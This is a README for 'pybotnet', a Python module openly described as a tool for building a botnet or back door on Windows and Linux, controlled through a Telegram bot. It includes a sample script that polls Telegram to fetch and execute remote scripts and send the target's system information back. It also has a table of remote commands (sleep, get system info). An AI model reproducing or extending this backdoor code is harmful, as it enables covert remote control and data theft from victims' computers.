# pybotnet version 0.06

A module for building botnet or back door with Python and Telegram control panel
- [x] windows
- [x] linux
- [ ] mac

### See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to *help* me <3

### Features:
* get command from telegram and execute scripts 
* get command and send message by third party proxy
* send target info 

for more features see command list ↓
 


### Requirements:

* Python 3.6 or higher.
```
pip install -r requirements.txt
```

### Sample:

```python
import pybotnet
import time

TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
ADMIN_CHAT_ID = '12345678910'
delay = 60

bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID, show_log=True, send_system_data=True)

while True:
    bot.get_and_execute_scripts_by_third_party_proxy()
    time.sleep(delay)

```

### Commmands:
Send this message to your api bot in telegram, using the admin account.

COMMAND | DO THIS | Minimum version required |
--------|---------|-------------------------|
do_sleep \<scconds> \<message> |  \<if message != none : print(message) > ; time.sleep(seccond) | 0.05 |
get_info | return system info | 0.06

